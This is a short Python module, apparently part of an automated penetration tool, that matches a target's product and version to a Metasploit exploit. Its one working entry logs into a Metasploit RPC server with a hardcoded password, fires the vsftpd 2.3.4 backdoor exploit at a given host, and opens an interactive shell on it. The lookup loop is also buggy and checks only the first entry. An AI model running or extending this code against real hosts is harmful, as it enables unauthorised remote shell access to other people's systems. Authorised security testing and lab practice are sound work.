# File with all the exploits that will be called by the main program
# DMO
# scalability

from pymetasploit3.msfrpc import MsfRpcClient

def compare_exploit(product, version):
    exploit_deck = [
        {"product": "vsftpd", "version": "2.3.4", "exploit": "vsftpd_234_backdoor"},
        {"product": "Product2", "version": "2.3"},
        {"product": "Product3", "version": "3.1"},
        # Ajouter exploit ici pour scalabilit√©
    ]
    for exploit in exploit_deck:
        if exploit["product"] == product and exploit["version"] == version:
            return exploit["exploit"]
        else:
            return "No exploit found"

def use_exploit(exploit,host):
    func = getattr(__import__("exploit_deck"), exploit)
    func(host)

# LISTE DES EXPLOITS
# Ajouter les exploits ici et leur config metasploit
# Voir exploit vsftpd_234_backdoor pour exemple

def vsftpd_234_backdoor(host):
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    print("we are cooking") # Debug

    # On get l'exploit
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

    # On configure l'exploit
    exploit['RHOSTS'] = host
    exploit['RPORT'] = "21"

    # On lance l'exploit
    exploit.execute(payload="cmd/unix/interact")
    print("Exploit launched")

    print("Sessions avaiables : ")
    if( client.sessions.list == {}):
        print("No session available")
    else:
        print("Opening shell...")
        client.sessions.session(list(client.sessions.list.keys())[0])
        print("shell opened")
